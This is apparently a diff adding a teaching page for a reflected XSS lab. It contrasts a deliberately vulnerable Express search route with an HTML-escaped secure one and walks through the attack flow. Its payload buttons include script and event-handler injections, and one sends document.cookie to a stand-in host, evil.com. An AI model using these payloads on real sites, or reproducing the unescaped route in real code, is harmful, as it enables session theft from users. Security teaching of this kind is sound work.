@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Reflected XSS — Vulnerable</title>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+  <nav class="topnav">
+    <a href="/" class="nav-home">&#8962; Home</a>
+    <span class="badge" style="background:#fef2f2;color:#dc2626;border:1.5px solid #dc2626">VULNERABLE</span>
+    <a href="/secure/reflected.html" class="switch-btn switch-to-secure">View Secure Version →</a>
+  </nav>
+
+  <main class="container">
+    <div class="page-header">
+      <h1>Reflected XSS</h1>
+      <p>The search query travels in the URL. The server reads it and injects it raw into the HTML response — no encoding.</p>
+    </div>
+
+    <div class="note vuln">
+      <span>&#9888;</span>
+      <div><strong>Root cause:</strong> Server reads <code>req.query.q</code> and writes it directly into the HTML template. Any HTML/JS in the value becomes live markup in the response.</div>
+    </div>
+
+    <!-- Try It -->
+    <p class="section-title">Try It</p>
+    <div class="try-it-box">
+      <div class="try-label">&#9888; Vulnerable Search</div>
+      <form class="demo-form" id="searchForm">
+        <input type="text" id="searchInput" placeholder="Enter a search term or payload..." autocomplete="off">
+        <button type="submit" class="btn btn-vuln">Search (Vulnerable)</button>
+      </form>
+      <p class="try-it-hint">Opens <code>/api/search?q=YOUR_INPUT</code> in a new tab — server reflects your input raw into the page HTML.</p>
+    </div>
+
+    <!-- Payload chips -->
+    <p class="section-title">Attack Payloads — Click to Load, Then Search</p>
+    <div class="payloads">
+      <h3>Click a payload to fill the field, then click Search</h3>
+      <button class="payload-tag" data-target="searchInput" data-payload="<script>alert('Reflected XSS')</script>">&lt;script&gt;alert('Reflected XSS')&lt;/script&gt;</button>
+      <button class="payload-tag" data-target="searchInput" data-payload="<img src=x onerror=alert(document.cookie)>">&lt;img src=x onerror=alert(document.cookie)&gt;</button>
+      <button class="payload-tag" data-target="searchInput" data-payload='"><svg onload=alert(1)>'>&quot;&gt;&lt;svg onload=alert(1)&gt;</button>
+      <button class="payload-tag" data-target="searchInput" data-payload="<script>document.location='http://evil.com?c='+document.cookie</script>">&lt;script&gt;document.location='http://evil.com?c='+document.cookie&lt;/script&gt;</button>
+    </div>
+
+    <!-- Code comparison -->
+    <p class="section-title">Code — Vulnerable vs Secure</p>
+    <div class="demo-grid">
+      <div class="panel">
+        <div class="panel-header vuln">&#128308; VULNERABLE — /api/search</div>
+        <div class="panel-body">
+          <div class="code-block"><span class="c-blue">app</span>.<span class="c-yellow">get</span>(<span class="c-green">'/api/search'</span>, (req, res) => {
+  <span class="c-purple">const</span> q = req.query.q || <span class="c-green">''</span>;
+
+  <span class="c-gray">// ❌ Raw user input injected into HTML</span>
+  res.<span class="c-yellow">send</span>(`
+    &lt;p&gt;Results for: <span class="c-red">${q}</span>&lt;/p&gt;
+  `);
+});</div>
+          <div class="note vuln" style="margin-top:8px;margin-bottom:0">
+            <span>&#9888;</span>
+            <span><code>${q}</code> is raw. <code>&lt;script&gt;</code> in it becomes live HTML.</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="panel">
+        <div class="panel-header secure">&#128994; SECURE — /api/search/safe</div>
+        <div class="panel-body">
+          <div class="code-block"><span class="c-blue">app</span>.<span class="c-yellow">get</span>(<span class="c-green">'/api/search/safe'</span>, (req, res) => {
+  <span class="c-purple">const</span> q = req.query.q || <span class="c-green">''</span>;
+
+  <span class="c-gray">// ✅ Escape before inserting into HTML</span>
+  <span class="c-purple">const</span> safe = <span class="c-yellow">escapeHtml</span>(q);
+  res.<span class="c-yellow">send</span>(`
+    &lt;p&gt;Results for: <span class="c-green">${safe}</span>&lt;/p&gt;
+  `);
+});</div>
+          <div class="note secure" style="margin-top:8px;margin-bottom:0">
+            <span>&#10003;</span>
+            <span><code>&lt;</code> → <code>&amp;lt;</code> — browser shows text, never executes.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Attack flow -->
+    <div class="how-it-works">
+      <h2>Attack Flow</h2>
+      <ul class="step-list">
+        <li><span class="step-num">1</span><div>Attacker crafts URL: <code>/api/search?q=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></div></li>
+        <li><span class="step-num">2</span><div>Sends link to victim via phishing email, social media, or QR code.</div></li>
+        <li><span class="step-num">3</span><div>Victim clicks — browser sends the request to the trusted server.</div></li>
+        <li><span class="step-num">4</span><div>Server returns HTML with the <code>&lt;script&gt;</code> embedded verbatim.</div></li>
+        <li><span class="step-num">5</span><div>Browser executes the script in the trusted domain's context — cookie theft complete.</div></li>
+      </ul>
+    </div>
+
+    <a href="/" class="btn btn-back">← Back to All Demos</a>
+  </main>
+
+  <div class="toast" id="toast">✓ Payload loaded — click Search</div>
+
+  <script>
+    // Payload auto-fill
+    document.querySelectorAll('.payload-tag[data-target]').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const input = document.getElementById(btn.dataset.target);
+        if (!input) return;
+        input.value = btn.dataset.payload;
+        input.focus();
+        btn.classList.add('filled');
+        setTimeout(() => btn.classList.remove('filled'), 1200);
+        showToast('✓ Payload loaded — click Search');
+      });
+    });
+
+    document.getElementById('searchForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      const q = document.getElementById('searchInput').value;
+      window.open('/api/search?q=' + encodeURIComponent(q), '_blank');
+    });
+
+    function showToast(msg) {
+      const t = document.getElementById('toast');
+      t.textContent = msg;
+      t.classList.add('show');
+      setTimeout(() => t.classList.remove('show'), 2000);
+    }
+  </script>
+</body>
+</html>
